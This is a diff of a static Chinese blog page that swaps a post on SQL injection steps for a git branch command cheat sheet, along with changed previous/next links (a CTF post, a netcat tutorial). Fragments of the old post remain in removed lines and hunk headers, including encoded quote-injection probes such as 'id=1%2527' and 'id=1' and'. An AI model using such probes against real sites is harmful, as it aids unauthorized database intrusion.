-<p>程序内部的数据调用，也要更严格的进行检查，一旦不小心，测试者就能将特定的 SQL 语句带入到查询当中。</p>
-</blockquote>
+<h3 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h3><pre class="line-numbers language-none"><code class="language-none"># 查看本地分支
+$ git branch
+# 查看远程分支
+$ git branch -r
+# 创建一个新分支
+$ git branch [branch-name]
+# 创建一个分支，并切换该分支
+$ git checkout -b [branch]
+# 切换到指定分支
+$ git checkout [branch]
+# 合并指定分支到当前分支
+$ git merge [branch]
+# 删除分支
+$ git branch -d [branch-name]
+# 删除远程分支
+$ git push origin [branch-name]
+$ git branch -dr [remote/branch]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -740,7 +581,7 @@ id=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<spa
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://southerose.gitee.io/2021/04/05/sql-inject/">http://southerose.gitee.io/2021/04/05/sql-inject/</a>
+                    <a href="http://southerose.gitee.io/2021/04/11/git/">http://southerose.gitee.io/2021/04/11/git/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -945,56 +786,17 @@ id=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<spa
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2021/04/06/xmctf/">
-                    <div class="card-image">
-                        
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409144039.png" class="responsive-img" alt="xmctf">
-                        
-                        <span class="card-title">xmctf</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-06
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/04/05/sql-inject/">
+                <a href="/2021/04/11/git/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/feature.jpg" class="responsive-img" alt="sql注入-详细步骤">
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182120.png" class="responsive-img" alt="git">
                         
-                        <span class="card-title">sql注入-详细步骤</span>
+                        <span class="card-title">git</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1005,14 +807,14 @@ id=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<spa
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-11
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    web安全
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    工具
                                 </a>
                             
                             
@@ -1020,6 +822,46 @@ id=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<spa
                     </div>
                 </div>
 
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/04/11/netcat/">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411180721.png" class="responsive-img" alt="netcat使用教程">
+                        
+                        <span class="card-title">netcat使用教程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    工具
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
                 
             </div>
         </div>
